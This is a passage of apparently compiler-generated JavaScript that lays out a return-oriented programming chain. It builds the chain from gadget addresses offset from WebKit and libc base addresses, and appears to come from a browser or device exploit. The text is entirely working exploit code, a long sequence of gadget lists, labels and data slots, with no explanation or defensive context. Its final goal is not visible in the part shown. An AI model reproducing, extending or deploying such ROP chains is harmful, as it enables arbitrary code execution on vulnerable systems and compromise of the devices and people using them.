set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+188672, //L2981+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+188664, //L2981
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2981:
db([0, 0]); // 0x0
set_gadgets([
ropchain+188688, //L2981+24
ropchain+188704, //L2976
libc_base+811575, //pop rsp
ropchain+188720, //L2982
//L2976:
libc_base+811575, //pop rsp
ropchain+193592, //L2983
//L2982:
libc_base+793877, //pop rsi
ropchain+188760, //L2984
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2984:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2986:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+188880, //L2989
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+188864, //L2987
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2987:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2989:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+189024, //L2992
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+188992, //L2990
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+189008, //L2991
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2990:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2991:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2992:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+189096, //L2993
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2993:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+189152, //L2995
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2995:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+189232, //L2997
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2997:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2999:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+189352, //L3002
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+189336, //L3000
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3000:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3002:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+189520, //L3005
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+189536, //L3006
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+189504, //L3003
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+189488, //L3004
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3004:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3003:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3005:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3006:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+189640, //L3007
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+189672, //L3009
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+189656, //L3008
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3007:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3008:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3009:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+189760, //L3010
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3010:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+189816, //L3012
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3012:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+189952, //L3015
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+189968, //L3016
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+189936, //L3014
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3014:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3015:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3016:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+190128, //L3020
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190080, //L3018
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+190112, //L3019
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3018:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3017:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L3019:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3020:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+190184, //L3022
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3022:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+190288, //L3024
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+190320, //L3025
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+190304, //L3023
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3024:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3023:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3025:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+190480, //L3029
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+190432, //L3027
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+190464, //L3028
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3027:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3026:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L3028:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3029:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+190536, //L3031
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3031:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+190640, //L3033
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+190672, //L3034
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+190656, //L3032
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3033:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3032:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3034:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+190832, //L3038
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+190784, //L3036
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+190816, //L3037
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3036:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3035:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L3037:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3038:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+190888, //L3040
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3040:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+190992, //L3042
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+191024, //L3043
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+191008, //L3041
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3042:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3041:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3043:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+191096, //L3044
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+191112, //L3045
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3044:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3045:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+191272, //L3049
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+191224, //L3047
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+191256, //L3048
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3047:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3046:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L3048:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3049:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+191328, //L3051
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3051:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+191432, //L3053
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+191464, //L3054
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+191448, //L3052
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3053:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3052:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3054:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+191560, //L3056
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+191544, //L3055
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3055:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3056:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+191640, //L3057
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3057:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3059:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+191760, //L3062
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+191744, //L3060
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3060:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3062:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+191904, //L3065
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+191872, //L3063
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+191888, //L3064
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3063:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3064:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3065:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+191976, //L3066
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3066:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+192032, //L3068
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3068:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+192112, //L3070
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3070:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3072:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+192232, //L3075
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192216, //L3073
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3073:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3075:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+192400, //L3078
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+192416, //L3079
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192384, //L3076
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+192368, //L3077
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3077:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3076:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3078:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3079:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+192520, //L3080
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+192552, //L3082
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+192536, //L3081
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3080:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3081:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3082:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+192640, //L3083
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3083:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+192696, //L3085
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3085:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+192768, //L3087
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+192824, //L3089
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3089:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L3091:
libc_base+793877, //pop rsi
ropchain+192912, //L3092
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3092:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3094:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+193032, //L3097
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193016, //L3095
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3095:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3097:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+193200, //L3100
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193216, //L3101
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193184, //L3098
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+193168, //L3099
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3099:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3098:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3100:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3101:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+193312, //L3103
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+193296, //L3102
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3102:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3103:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+193400, //L3105
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3104:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3105:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+193456, //L3106
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3106:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3108:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+193536, //L3109
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3109:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+811575, //pop rsp
ropchain+187448, //L2950
//L2983:
//L2944:
libc_base+793877, //pop rsi
ropchain+193632, //L3111
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3111:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3113:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+193752, //L3116
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193736, //L3114
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3114:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3116:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+193896, //L3119
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193864, //L3117
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+193880, //L3118
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3117:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3118:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3119:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3121:
ropchain+194000, //L3120
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+194784, //L3122
//L3120:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+194072, //L3124
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3124:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3123:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3125:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+194208, //L3126
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194240, //L3128
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+194224, //L3127
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3126:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3127:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3128:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+194336, //L3129
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194352, //L3130
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L3129:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3130:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+194464, //L3131
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194448, //L3132
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3132:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L3131:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+194552, //L3134
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+194536, //L3133
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3133:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3134:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+194648, //L3135
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194664, //L3136
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L3135:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3136:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+194776, //L3137
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194760, //L3138
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3138:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L3137:
db([0, 0]); // 0x0
//L3122:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
